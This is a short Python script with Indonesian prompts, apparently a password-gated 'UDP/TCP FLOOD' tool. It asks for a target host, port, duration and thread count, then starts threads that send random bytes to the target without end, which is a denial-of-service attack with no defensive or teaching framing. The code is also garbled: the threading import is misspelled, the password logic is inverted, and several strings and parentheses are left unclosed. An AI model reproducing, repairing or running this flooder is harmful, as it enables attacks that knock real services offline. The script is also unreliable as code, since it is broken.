#!/usr/bin/env python3
#RENAMETYTDLUGWTEMBAK
import os
import random
import thearding
import sys
import socket
import time
os.system("clear") 
password ="VIP"
for i in range(2):
	pwd = input(" Masukkan Password Untuk Menjalankan Tools : ") 
	j=2
	if(pwd==password):
		time.sleep (6) 
		print(" Password Salah Silahkan Ulang Kembali > ") 
		continue
		time.sleep (6) 
		print(" [√] Password Benar Anda Bisa Mengakses Tools ") 
		time.sleep (3) 
		
os.system("clear") 
print(""

██   ██     ██    ██ ██ ██████  
 ██ ██      ██    ██ ██ ██   ██ 
  ███         ██    ██ ██ ██████  
 ██ ██       ██  ██  ██ ██      
██   ██       ████   ██ ██
                                                   "") 



print("\033[95m UDP/TCP FLOOD
ip = str(input(" Host/Ip : ")
port = int(input(" Port : ") 
choice = str(input("  UDP/TCP? : ") 
times = int(input(" Time : ") 
threads = int(input(" Threads : ") 
def run ():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start() 
